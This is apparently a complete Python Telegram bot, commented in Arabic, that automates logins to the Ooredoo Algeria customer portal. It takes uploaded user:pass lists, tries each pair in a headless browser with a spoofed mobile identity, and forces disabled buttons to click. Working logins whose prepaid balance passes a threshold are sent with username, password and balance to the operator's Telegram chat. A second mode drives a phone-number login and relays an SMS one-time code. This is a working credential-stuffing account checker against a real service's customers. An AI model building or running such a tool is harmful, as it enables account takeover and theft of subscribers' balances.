#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Ooredoo Bot
- user:pass (من ملف) → فحص عادي
- رقم فقط (من رسالة) → OTP flow
"""

import os
import re
import time
import asyncio
import logging

from dotenv import load_dotenv
from playwright.async_api import async_playwright
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes,
)
from telegram.request import HTTPXRequest

load_dotenv()

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = int(os.getenv("TELEGRAM_CHAT_ID", "0"))
MIN_BALANCE = int(os.getenv("MIN_BALANCE", "100"))
HEADLESS = os.getenv("HEADLESS", "true").lower() == "true"
RETRY_DELAY = 3

HOME_URL = "https://my.ooredoo.dz/"
SIGNIN_URL = "https://my.ooredoo.dz/sign-in"

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("ooredoo")

LOG_FILE = "/tmp/bot.log"
try:
    fh = logging.FileHandler(LOG_FILE, encoding="utf-8")
    fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
    logging.getLogger().addHandler(fh)
except Exception:
    pass


def log_to_file(msg, level="INFO"):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [{level}] {msg}\n")
    except Exception:
        pass


# حالة عامة
state = {
    "running": False,
    "stop": False,
    "stats": None,
    # OTP flow
    "otp_waiting": False,
    "otp_future": None,
    "otp_chat": None,
}


class Stats:
    def __init__(self):
        self.total = 0
        self.done = 0
        self.success = 0
        self.hit = 0
        self.no_balance = 0
        self.invalid = 0
        self.retries = 0
        self.errors = 0
        self.start_time = time.time()
        self.hits = []

    def elapsed(self):
        s = int(time.time() - self.start_time)
        h, m, s = s // 3600, (s % 3600) // 60, s % 60
        if h:
            return f"{h}h {m}m {s}s"
        if m:
            return f"{m}m {s}s"
        return f"{s}s"

    def summary(self):
        return (
            f"📊 <b>ملخص</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"المجموع: <b>{self.total}</b>\n"
            f"تم: <b>{self.done}</b>\n"
            f"✅ نجح: <b>{self.success}</b>\n"
            f"💰 مؤهل: <b>{self.hit}</b>\n"
            f"⚠️ بلا رصيد: <b>{self.no_balance}</b>\n"
            f"❌ invalid: <b>{self.invalid}</b>\n"
            f"🔄 إعادات: <b>{self.retries}</b>\n"
            f"🛑 أخطاء: <b>{self.errors}</b>\n"
            f"⏱️ المدة: <b>{self.elapsed()}</b>"
        )


def parse_accounts(text):
    out = []
    for line in text.split("\n"):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = re.split(r"[:\t;,]", line, maxsplit=1)
        if len(parts) < 2:
            continue
        user = parts[0].strip()
        pwd = parts[1].strip()
        if user and pwd:
            out.append((user, pwd))
    return out


def is_single_phone(text):
    """نتحققو إذا الرسالة هي رقم فقط"""
    text = text.strip()
    if not text or ":" in text or " " in text:
        return False
    digits = re.sub(r"\D", "", text)
    if len(digits) < 9 or len(digits) > 13:
        return False
    return True


def find_balance_in_text(text):
    if not text:
        return None
    pats = [
        r"(?:solde|balance|رصيد|الرصيد)\D{0,30}([\d]+[.,][\d]{1,2})",
        r"([\d]+[.,][\d]{1,2})\s*(?:DA|دج|DZD)",
    ]
    for p in pats:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            try:
                return float(m.group(1).replace(",", "."))
            except Exception:
                continue
    return None


def is_invalid_creds(text):
    if not text:
        return False
    t = text.lower()
    return any(p in t for p in [
        "identifiants non valides",
        "identifiants incorrects",
        "invalid user credentials",
        "invalid credentials",
        "mot de passe incorrect",
        "utilisateur non trouvé",
        "numéro de téléphone non valide",
        "numéro non valide",
        "numéro invalide",
        "invalid phone",
        "invalid number",
        "phone number invalid",
        "email invalide",
        "email invalid",
        "invalid email",
        "compte non trouvé",
        "compte introuvable",
        "utilisateur inconnu",
        "user not found",
        "account not found",
    ])


# ============================================================
#  OTP Flow - رقم فقط
# ============================================================
async def run_otp_flow(app, chat_id, phone):
    bot = app.bot

    await bot.send_message(chat_id=chat_id,
        text=f"📱 <b>OTP Flow</b>\nالرقم: <code>{phone}</code>\n"
             f"راح نفتحو الصفحة ونجربو...",
        parse_mode="HTML")

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=HEADLESS,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"])
        ctx = await browser.new_context(
            locale="fr-FR",
            viewport={"width": 412, "height": 915},
            user_agent=("Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"),
        )
        page = await ctx.new_page()

        try:
            # 1) نفتحو الصفحة الرئيسية
            await bot.send_message(chat_id=chat_id,
                text="🌐 نفتحو my.ooredoo.dz...")
            await page.goto(HOME_URL, wait_until="domcontentloaded", timeout=60000)
            await page.wait_for_timeout(4000)

            # 2) ننتظرو حقل الرقم
            try:
                await page.wait_for_selector("input[placeholder*='05']", timeout=15000)
            except Exception:
                pass

            # 3) نصوّرو الصفحة
            await page.screenshot(path="/tmp/otp_step1.png", full_page=True)
            with open("/tmp/otp_step1.png", "rb") as f:
                await bot.send_photo(chat_id=chat_id, photo=f,
                    caption="📸 الصفحة الرئيسية", parse_mode="HTML")

            # 4) نكتبو الرقم
            ok = False
            try:
                loc = page.locator("input[placeholder*='05'], input[type='number'], input[inputmode='tel']").first
                if await loc.count() > 0:
                    await loc.click(timeout=5000)
                    await page.wait_for_timeout(200)
                    await page.keyboard.press("Control+A")
                    await page.keyboard.press("Delete")
                    await page.keyboard.type(phone, delay=80)
                    await page.wait_for_timeout(500)
                    val = await loc.input_value()
                    if val:
                        ok = True
                        log_to_file(f"OTP: filled {phone}")
            except Exception as e:
                log_to_file(f"OTP fill failed: {e}", "ERROR")

            if not ok:
                await bot.send_message(chat_id=chat_id,
                    text="❌ ما قدرناش نكتبو الرقم")
                await browser.close()
                return

            # 5) نصوّرو بعد الكتابة
            await page.screenshot(path="/tmp/otp_step2.png", full_page=True)
            with open("/tmp/otp_step2.png", "rb") as f:
                await bot.send_photo(chat_id=chat_id, photo=f,
                    caption=f"📸 بعد كتابة الرقم <code>{phone}</code>",
                    parse_mode="HTML")

            # 6) نضغطو زر "Accéder avec le numéro"
            clicked = False
            try:
                btn = page.get_by_role("button",
                    name=re.compile("acc[ée]der|num[ée]ro", re.I))
                if await btn.count() > 0:
                    await btn.first.click(timeout=5000)
                    clicked = True
                    log_to_file("OTP: clicked access button")
            except Exception as e:
                log_to_file(f"OTP button click: {e}", "WARN")

            if not clicked:
                # نجربو JS
                try:
                    clicked = bool(await page.evaluate("""
                        () => {
                            const btns = [...document.querySelectorAll('button')];
                            const t = btns.find(b =>
                                /acc[ée]der/i.test(b.textContent || '') &&
                                /num[ée]ro/i.test(b.textContent || '')
                            );
                            if (!t) return false;
                            t.removeAttribute('disabled');
                            t.disabled = false;
                            t.click();
                            return true;
                        }
                    """))
                except Exception:
                    pass

            if not clicked:
                await bot.send_message(chat_id=chat_id,
                    text="❌ ما لقيناش زر الدخول")
                await browser.close()
                return

            # 7) نستنو صفحة OTP
            await page.wait_for_timeout(5000)

            # نصوّرو
            await page.screenshot(path="/tmp/otp_step3.png", full_page=True)
            with open("/tmp/otp_step3.png", "rb") as f:
                await bot.send_photo(chat_id=chat_id, photo=f,
                    caption="📸 الصفحة بعد الضغط — تأكد من OTP",
                    parse_mode="HTML")

            # 8) نطلب الرمز من المستخدم
            loop = asyncio.get_event_loop()
            fut = loop.create_future()
            state["otp_waiting"] = True
            state["otp_future"] = fut
            state["otp_chat"] = chat_id

            await bot.send_message(chat_id=chat_id,
                text="🔐 <b>ابعتلي رمز OTP</b> (اللي جاك في SMS)",
                parse_mode="HTML")

            try:
                otp_code = await asyncio.wait_for(fut, timeout=300)
            except asyncio.TimeoutError:
                await bot.send_message(chat_id=chat_id, text="⏰ ما جاش الرمز.")
                await browser.close()
                return
            finally:
                state["otp_waiting"] = False
                state["otp_future"] = None
                state["otp_chat"] = None

            log_to_file(f"OTP code received: {otp_code}")

            # 9) نكتبو الرمز
            otp_filled = False
            try:
                # ندورو على حقول OTP (عدة input)
                inputs = await page.locator("input[type='tel'], input[type='number'], input[inputmode='numeric'], input[type='text']").all()
                if len(inputs) >= 4:
                    # OTP من 4-6 خانات
                    for i, ch in enumerate(otp_code[:len(inputs)]):
                        try:
                            await inputs[i].fill(ch)
                            await page.wait_for_timeout(100)
                        except Exception:
                            pass
                    otp_filled = True
                elif len(inputs) == 1:
                    await inputs[0].fill(otp_code)
                    otp_filled = True
            except Exception as e:
                log_to_file(f"OTP fill: {e}", "ERROR")

            if not otp_filled:
                # نجربو بالـ keyboard
                try:
                    await page.keyboard.type(otp_code, delay=100)
                    otp_filled = True
                except Exception:
                    pass

            await page.wait_for_timeout(500)

            # 10) نصوّرو
            await page.screenshot(path="/tmp/otp_step4.png", full_page=True)
            with open("/tmp/otp_step4.png", "rb") as f:
                await bot.send_photo(chat_id=chat_id, photo=f,
                    caption=f"📸 بعد كتابة الرمز <code>{otp_code}</code>",
                    parse_mode="HTML")

            # 11) نضغطو زر التحقق
            try:
                btn = page.get_by_role("button",
                    name=re.compile("valider|v[ée]rifier|confirmer|suivant|continuer", re.I))
                if await btn.count() > 0:
                    await btn.first.click(timeout=5000)
            except Exception:
                try:
                    await page.evaluate("""
                        () => {
                            const btns = [...document.querySelectorAll('button')];
                            const t = btns.find(b =>
                                /valider|v[ée]rifier|confirmer|suivant|continuer/i.test(b.textContent || '')
                            );
                            if (t) {
                                t.removeAttribute('disabled');
                                t.disabled = false;
                                t.click();
                            }
                        }
                    """)
                except Exception:
                    pass

            # 12) نستنو النتيجة
            await page.wait_for_timeout(8000)
            try:
                await page.wait_for_load_state("networkidle", timeout=30000)
            except Exception:
                pass

            # 13) نصوّرو الصفحة النهائية
            await page.screenshot(path="/tmp/otp_final.png", full_page=True)
            with open("/tmp/otp_final.png", "rb") as f:
                await bot.send_photo(chat_id=chat_id, photo=f,
                    caption="📸 الصفحة النهائية", parse_mode="HTML")

            # 14) نقراو الرصيد
            try:
                body = await page.inner_text("body")
            except Exception:
                body = ""

            bal = find_balance_in_text(body)
            log_to_file(f"OTP final balance: {bal}")

            if bal is not None:
                await bot.send_message(chat_id=chat_id,
                    text=f"💰 <b>الرصيد: {bal} دج</b>\n"
                         f"📱 <code>{phone}</code>",
                    parse_mode="HTML")
            else:
                await bot.send_message(chat_id=chat_id,
                    text="⚠️ دخلنا لكن ما لقيناش الرصيد — شوف الصورة",
                    parse_mode="HTML")

        except Exception as e:
            log_to_file(f"OTP flow exception: {e}", "ERROR")
            await bot.send_message(chat_id=chat_id, text=f"❌ خطأ: <code>{e}</code>",
                                    parse_mode="HTML")
        finally:
            try:
                await browser.close()
            except Exception:
                pass


# ============================================================
#  Username Flow - العادي
# ============================================================
async def wait_page_ready(page, timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        try:
            has = await page.evaluate("""
                () => {
                    const u = document.querySelector("input[aria-label='Username']");
                    const p = document.querySelector("input[type='password']");
                    return !!(u && p);
                }
            """)
            if has:
                return True
        except Exception:
            pass
        await asyncio.sleep(0.3)
    return False


async def fill_username(page, username):
    try:
        loc = page.locator("input[aria-label='Username']").first
        if await loc.count() == 0:
            loc = page.locator("input[type='text']").first
        if await loc.count() == 0:
            return False

        await loc.scroll_into_view_if_needed()
        await loc.click(timeout=5000)
        await page.wait_for_timeout(200)

        await page.keyboard.press("Control+A")
        await page.keyboard.press("Delete")
        await page.wait_for_timeout(100)

        await page.keyboard.type(username, delay=80)
        await page.wait_for_timeout(300)

        return await loc.input_value() == username
    except Exception:
        return False


async def fill_password(page, password):
    try:
        loc = page.locator("input[type='password']").first
        if await loc.count() == 0:
            return False

        await loc.scroll_into_view_if_needed()
        await loc.click(timeout=5000)
        await page.wait_for_timeout(200)

        await page.keyboard.press("Control+A")
        await page.keyboard.press("Delete")
        await page.wait_for_timeout(100)

        await page.keyboard.type(password, delay=80)
        await page.wait_for_timeout(300)

        return await loc.input_value() == password
    except Exception:
        return False


async def click_connexion(page):
    try:
        btn = page.get_by_role("button", name=re.compile("connexion", re.I))
        if await btn.count() > 0:
            el = btn.first
            for i in range(20):
                d = await el.get_attribute("disabled")
                if d is None:
                    break
                await asyncio.sleep(0.5)
            try:
                await el.click(timeout=5000)
                return True
            except Exception:
                await el.click(force=True)
                return True
    except Exception:
        pass

    try:
        ok = await page.evaluate("""
            () => {
                const btns = [...document.querySelectorAll('button')];
                const t = btns.find(b => /connexion/i.test(b.textContent || ''));
                if (!t) return false;
                t.removeAttribute('disabled');
                t.disabled = false;
                t.classList.remove('v-btn--disabled');
                t.click();
                return true;
            }
        """)
        return bool(ok)
    except Exception:
        return False


async def detect_red_error(page):
    try:
        err = await page.evaluate("""
            () => {
                const vmsgs = [...document.querySelectorAll(
                    '.v-messages__message, .v-input__details .v-messages'
                )];
                for (const m of vmsgs) {
                    const t = (m.textContent || '').trim();
                    if (t.length > 3 && t.length < 200) {
                        const st = getComputedStyle(m);
                        if (st.display !== 'none' && st.visibility !== 'hidden') {
                            return t;
                        }
                    }
                }
                const toasts = [...document.querySelectorAll(
                    '.Vue-Toastification__toast, .v-snackbar, .v-alert'
                )];
                for (const t of toasts) {
                    const txt = (t.textContent || '').trim();
                    if (txt.length > 3 && txt.length < 300) {
                        const st = getComputedStyle(t);
                        if (st.display !== 'none' && st.visibility !== 'hidden') {
                            return txt;
                        }
                    }
                }
                return null;
            }
        """)
        if err:
            return err.strip()
    except Exception:
        pass

    try:
        body = await page.inner_text("body")
    except Exception:
        body = ""

    pats = [
        r"(identifiants?\s+non\s+valides[^\n]{0,100})",
        r"(identifiants?\s+incorrect[s]?[^\n]{0,100})",
        r"(mot de passe\s+incorrect[^\n]{0,100})",
        r"(invalid user credentials[^\n]{0,100})",
        r"(email\s+invalide[^\n]{0,100})",
        r"(num[ée]ro\s+de\s+t[ée]l[ée]phone\s+non\s+valide[^\n]{0,100})",
        r"(num[ée]ro\s+non\s+valide[^\n]{0,100})",
        r"(num[ée]ro\s+invalide[^\n]{0,100})",
        r"(compte\s+non\s+trouv[ée][^\n]{0,100})",
    ]
    for p in pats:
        m = re.search(p, body, re.IGNORECASE)
        if m:
            return m.group(1).strip()
    return None


async def wait_for_result(page, timeout=60):
    start = time.time()
    last_url = page.url

    while time.time() - start < timeout:
        if page.url != last_url:
            if "/sign-in" not in page.url and "/login" not in page.url:
                return {"status": "success", "url": page.url}
            last_url = page.url

        err = await detect_red_error(page)
        if err:
            return {"status": "error", "error": err}

        if "/sign-in" not in page.url and "/login" not in page.url:
            try:
                if await page.locator("input[type=password]").count() == 0:
                    return {"status": "success", "url": page.url}
            except Exception:
                pass

        await asyncio.sleep(0.5)

    return {"status": "timeout"}


async def try_account(browser, user, pwd, bot, chat_id):
    ctx = await browser.new_context(
        locale="fr-FR",
        viewport={"width": 412, "height": 915},
        user_agent=("Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"),
    )
    page = await ctx.new_page()

    try:
        await page.goto(SIGNIN_URL, wait_until="domcontentloaded", timeout=60000)

        if not await wait_page_ready(page, timeout=30):
            await ctx.close()
            return {"status": "retry", "msg": "page not ready"}

        await page.wait_for_timeout(500)

        if state["stop"]:
            await ctx.close()
            return {"status": "retry", "msg": "stopped"}

        try:
            await page.evaluate("""
                () => {
                    document.querySelectorAll('input').forEach(inp => {
                        if (inp.type === 'text' || inp.type === 'password') {
                            inp.value = '';
                        }
                    });
                }
            """)
            await page.wait_for_timeout(300)
        except Exception:
            pass

        if not await fill_username(page, user):
            await ctx.close()
            return {"status": "retry", "msg": "fill_username"}

        await page.wait_for_timeout(200)

        if not await fill_password(page, pwd):
            await ctx.close()
            return {"status": "retry", "msg": "fill_password"}

        await page.wait_for_timeout(500)

        try:
            await page.screenshot(path="/tmp/before.png", full_page=True)
            with open("/tmp/before.png", "rb") as f:
                await bot.send_photo(chat_id=chat_id, photo=f,
                    caption=f"📸 قبل: <code>{user}</code>", parse_mode="HTML")
        except Exception:
            pass

        if not await click_connexion(page):
            await ctx.close()
            return {"status": "retry", "msg": "click"}

        result = await wait_for_result(page, timeout=60)

        try:
            await page.screenshot(path="/tmp/after.png", full_page=False)
            with open("/tmp/after.png", "rb") as f:
                await bot.send_photo(chat_id=chat_id, photo=f,
                    caption=f"📸 بعد: <code>{user}</code>", parse_mode="HTML")
        except Exception:
            pass

        if result["status"] == "success":
            await page.wait_for_timeout(2000)
            body = await page.inner_text("body")
            bal = find_balance_in_text(body)
            await ctx.close()
            return {"status": "success", "balance": bal}

        if result["status"] == "error":
            err = result["error"]
            await ctx.close()
            if is_invalid_creds(err):
                return {"status": "invalid", "msg": err}
            return {"status": "error", "msg": err, "stop": True}

        await ctx.close()
        return {"status": "retry", "msg": "timeout"}

    except Exception as e:
        log_to_file(f"try_account: {e}", "ERROR")
        try:
            await ctx.close()
        except Exception:
            pass
        return {"status": "retry", "msg": str(e)}


async def run_check(app, chat_id, accounts):
    stats = Stats()
    stats.total = len(accounts)
    state["stats"] = stats
    bot = app.bot

    await bot.send_message(chat_id=chat_id,
        text=f"🚀 <b>بداية</b>\nعدد: <b>{len(accounts)}</b>\n"
             f"♻️ يتخطى أي خطأ",
        parse_mode="HTML")

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=HEADLESS,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"])
        try:
            for idx, (user, pwd) in enumerate(accounts, 1):
                if state["stop"]:
                    break

                await bot.send_message(chat_id=chat_id,
                    text=f"🔄 [{idx}/{len(accounts)}] <code>{user}</code>",
                    parse_mode="HTML")

                attempts = 0
                max_attempts = 3

                while attempts < max_attempts:
                    if state["stop"]:
                        break
                    attempts += 1

                    try:
                        r = await try_account(browser, user, pwd, bot, chat_id)
                    except Exception:
                        r = {"status": "retry", "msg": "exception"}

                    if r.get("stop"):
                        stats.errors += 1
                        stats.done += 1
                        await bot.send_message(chat_id=chat_id,
                            text=f"🛑 <b>توقف</b>\nالسبب: <code>{r.get('msg')}</code>",
                            parse_mode="HTML")
                        state["stop"] = True
                        break

                    if r["status"] == "success":
                        stats.success += 1
                        stats.done += 1
                        bal = r.get("balance")
                        if bal is None:
                            stats.no_balance += 1
                        elif bal >= MIN_BALANCE:
                            stats.hit += 1
                            await bot.send_message(chat_id=chat_id,
                                text=f"💰 <b>مؤهل!</b>\n"
                                     f"👤 <code>{user}</code>\n"
                                     f"🔑 <code>{pwd}</code>\n"
                                     f"💵 <b>{bal}</b> دج",
                                parse_mode="HTML")
                        else:
                            await bot.send_message(chat_id=chat_id,
                                text=f"✅ دخل {user} | رصيد: {bal} دج",
                                parse_mode="HTML")
                        break

                    if r["status"] == "invalid":
                        stats.invalid += 1
                        stats.done += 1
                        await bot.send_message(chat_id=chat_id,
                            text=f"❌ <code>{user}</code> → التالي",
                            parse_mode="HTML")
                        break

                    stats.retries += 1
                    await asyncio.sleep(RETRY_DELAY)

                if attempts >= max_attempts and r.get("status") == "retry":
                    stats.done += 1

                if state["stop"]:
                    break
        finally:
            await browser.close()

    try:
        await bot.send_message(chat_id=chat_id, text=stats.summary(), parse_mode="HTML")
    except Exception:
        pass

    state["running"] = False
    state["stop"] = False


# ============================================================
#  Telegram Handlers
# ============================================================
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚀 <b>بوت Ooredoo</b>\n\n"
        "📁 <b>ابعتلي ملف</b> <code>accounts.txt</code> (user:pass) → فحص عادي\n\n"
        "📱 <b>ولا ابعتلي رقم فقط</b> → OTP flow\n"
        "   مثال: <code>0553372434</code>\n\n"
        "/start /status /stop /log",
        parse_mode="HTML")


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if state["running"]:
        s = state["stats"]
        await update.message.reply_text(
            f"⏳ {s.done}/{s.total}\n"
            f"✅ {s.success} | 💰 {s.hit} | ❌ {s.invalid}",
            parse_mode="HTML")
    elif state["otp_waiting"]:
        await update.message.reply_text("🔐 نستنو رمز OTP...")
    else:
        await update.message.reply_text("✅ جاهز.")


async def cmd_log(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        with open(LOG_FILE, "rb") as f:
            await update.message.reply_document(document=f, filename="bot.log",
                                                 caption="📋 Logs")
    except Exception as e:
        await update.message.reply_text(f"❌ {e}")


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    state["stop"] = True
    if state["otp_future"] and not state["otp_future"].done():
        state["otp_future"].cancel()
    await update.message.reply_text("⏹️")


async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != TELEGRAM_CHAT_ID:
        return
    if state["running"]:
        await update.message.reply_text("⚠️ فحص جاري.")
        return
    doc = update.message.document
    if not doc:
        return
    file = await ctx.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    text = data.decode("utf-8", errors="ignore")
    accounts = parse_accounts(text)
    if not accounts:
        await update.message.reply_text("❌ فارغ.")
        return
    state["running"] = True
    state["stop"] = False
    await update.message.reply_text(
        f"📄 {len(accounts)} حساب.\nنبداو...",
        parse_mode="HTML")
    asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))


async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != TELEGRAM_CHAT_ID:
        return

    text = update.message.text.strip()

    # 🔐 إذا كنا نستنو OTP
    if state["otp_waiting"] and state["otp_future"] and not state["otp_future"].done():
        state["otp_future"].set_result(text)
        await update.message.reply_text(f"✅ توصلنا: <code>{text}</code>",
                                          parse_mode="HTML")
        return

    if text.startswith("/"):
        return

    # 📁 file content pasted? أو حساب واحد
    accounts = parse_accounts(text)
    if accounts and len(accounts) > 0:
        if state["running"]:
            await update.message.reply_text("⚠️ فحص جاري.")
            return
        state["running"] = True
        state["stop"] = False
        await update.message.reply_text(
            f"📄 {len(accounts)} حساب.", parse_mode="HTML")
        asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))
        return

    # 📱 رقم فقط → OTP
    if is_single_phone(text):
        if state["running"]:
            await update.message.reply_text("⚠️ فحص جاري.")
            return
        state["running"] = True
        state["stop"] = False
        asyncio.create_task(run_otp_flow(ctx.application, update.effective_chat.id, text))
        return

    await update.message.reply_text(
        "💡 ابعتلي:\n"
        "• ملف <code>accounts.txt</code> (user:pass)\n"
        "• رقم فقط (مثال: 0553372434) → OTP flow",
        parse_mode="HTML")


def main():
    print("🚀 Ooredoo Bot starting...")
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        raise Exception("TELEGRAM_TOKEN أو TELEGRAM_CHAT_ID ناقصين")

    request = HTTPXRequest(
        connection_pool_size=8,
        connect_timeout=30.0,
        read_timeout=30.0,
        write_timeout=30.0,
        pool_timeout=30.0,
    )
    app = (Application.builder()
           .token(TELEGRAM_TOKEN)
           .request(request)
           .get_updates_request(request)
           .build())

    async def on_error(update, context):
        log_to_file(f"Handler error: {context.error}", "ERROR")

    app.add_error_handler(on_error)
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("log", cmd_log))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("✅ Bot running")
    app.run_polling(allowed_updates=Update.ALL_TYPES,
                    poll_interval=2.0, timeout=30)


if __name__ == "__main__":
    main()
